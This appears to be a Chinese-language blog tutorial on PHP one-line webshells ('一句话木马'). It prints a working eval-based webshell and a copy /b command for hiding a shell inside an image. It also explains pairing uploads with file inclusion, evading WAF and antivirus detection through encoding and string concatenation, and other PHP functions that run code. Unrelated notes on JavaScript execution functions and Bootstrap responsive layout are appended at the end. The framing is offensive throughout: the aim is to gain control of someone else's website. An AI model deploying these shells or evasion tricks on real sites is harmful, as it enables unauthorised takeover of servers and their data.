一句话木马

概述

在很多情况下，我们找到上传点，需要上传小马，来进行我们的后续操作，这里的小马，就是一句话木马。

来看最简单的一句话木马。

@是屏蔽报错，POST是发送数据的方式，eval是命令执行的函数，这么看，他大概分为三部分

==程序语言的固定格式== + ==所对应程序语言能执行系统命令的函数(调用了对应的接口)== + ==传递数据的方式==

所以稍后会讲命令执行的函数有哪些。

利用条件[文件上传]

  1. 木马未被删除，成功上传到主机
  2. 知道木马上传的绝对路径
  3. 上传的木马能够在对方的环境下成功解析

一句话木马的变形

图片马[文件上传+文件包含]

综上所述，一句话木马用在当我们可以上传文件的时候，但是，有的网站自然限制了上传文件的图片，那么，我们就可以做图片马

这个东西，是在大一时候B站上，小甲鱼的C语言第一次知道的。

就是把两个文件的数据叠加到一起，更改后缀可以任意切换文件类型。

文件头A+文件流A+文件尾A

文件B同理

使用命令 copy copy 木马.php/a+ 任意图片.jpg /b muma.jpg

“b”表示“二进制文件” a”表示ASCII码文件。

这里说一下，虽然这里的jpg文件，已经包含进去了php的数据，但是后缀名还是jpg，导致无法被解析成php文件

类似于dvwa的高难度一样，不是前端验证，于是无法通过抓包改包来达到目的。这时候就需要文件包含

文件上传+文件包含

使用文件包含图片马后，就会在目录下多出muma.php,当然，文件包含以后，也可以直接在POST里请求命令。

木马免杀(简单思路)

一句话木马太简单了，特征太明显了，一般危险的函数都会被检测到，所以，除了命名要迷惑管理员或者隐藏外，我们还需要一些思路

(内心os:只要思路宽，绕狗绕到欢)

如，base64，hex编码等，将关键代码放在乱七八糟的代码中进行绕过。避免waf识别

字符串不断拼接

他还是一句话木马，不过是进行了好几次的拼接和转换。

大马

大马的体积就比较大了，通常在50K左右，比小马会大好多倍，但对应的功能也很强大，包括对数据的管理，命令的操作，数据库的管理，解压缩，和提权等功能，都非常强大。这种大马一旦网站被种了，网站基本就在这个大马控制之中。大马的隐蔽性不好，因为涉及很多敏感代码，安全类程序很容易扫描到

后门执行函数

eval

eval()函数会将传入的字符串当作PHP代码来执行

所以最常见的也是一句话木马也是eval函数

<?php @eval($_REQUEST['pass']); ?>

这里采用了Request方法

$_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件

既可以在POST中传递 pass=xxxxx,也可以在get请求中输入参数?pass=xxxx

assert

assert本身是断言函数，判断正确与否，但是当输入字符串的时候，会被当做代码执行。

经过我的实验，assert本身只能执行函数。

call_user_func_array()

把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。

与上面类似，只不过这次需要将，第二个参数转换为数组形式。

array_filter()

依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变

这里简单说一下定义的odd和 even函数，用来判断是奇数还是偶数

& 按位与 ，把每个输入的数都转化为二进制数据，有且仅当每一位都是1的时候，结果才是1;

如果是奇数的话，和1做按位与&的运算，结果只会是1,如果结果不为1，结果只能是偶数

script中的知识点

Windows对象

弹窗

  • alert：只弹出一个用于确定的对话框
  • confirm：弹出一个用于确认和取消的对话框，确认返回 true,取消返回false
  • prompt：弹出一个可以提示用户输入的对话框。

执行脚本的函数

  • eval
  • setTimeout(“脚本”,时间(毫秒))
  • setInterval(“脚本”，时间(毫秒))
  • setAttribute(“某属性”，“属性的值”)
  • removeAttribute (作用于上面相反)

这些都可以成为执行命令的函数

响应式布局

同一套页面可以兼容不同分辨率的设备

  • 实现: 依赖于栅格系统

  • 步骤:

    • 定义容器，相当于之前的table

      • 容器分类：
        • container
        • container-fluid

    • 定义行，相当于之前的tr

    • 定义元素，指定该元素在不同的设备上，所在的各自的数目

      样式: col - 设备代号 - 各自数目
